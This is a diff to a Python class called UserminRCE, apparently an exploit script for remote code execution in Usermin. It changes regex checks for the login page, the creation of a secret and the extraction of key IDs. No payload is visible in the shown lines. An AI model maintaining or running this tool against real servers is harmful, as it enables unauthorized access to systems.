@@ -103,7 +103,7 @@ class UserminRCE:
             if response.status_code == 200:
                 # Use the original login check method
                 login_content = str(response.content)
-                search = "webmin_search.cgi"
+                search = r"webmin_search\.cgi"
                 check_login_string = re.findall(search, login_content)
                 
                 if check_login_string:
@@ -162,7 +162,7 @@ class UserminRCE:
             if response.status_code == 200:
                 # Use the original success check method
                 create_secret_content = str(response.content)
-                search = "successfully"
+                search = r"successfully"
                 check_exp = re.findall(search, create_secret_content)
                 
                 if check_exp:
@@ -191,9 +191,9 @@ class UserminRCE:
             response = self.session.post(list_keys_url, verify=False, timeout=10)
             
             if response.status_code == 200:
-                # Use the original key extraction method
+                # Use the original key extraction method with raw string
                 key_list_content = str(response.content)
-                keys = re.findall("edit_key.cgi\?(.*?)'", key_list_content)
+                keys = re.findall(r"edit_key\.cgi\?(.*?)'", key_list_content)
                 
                 if keys and len(keys) >= 2:
                     # Use [-2] like the original (second to last key)
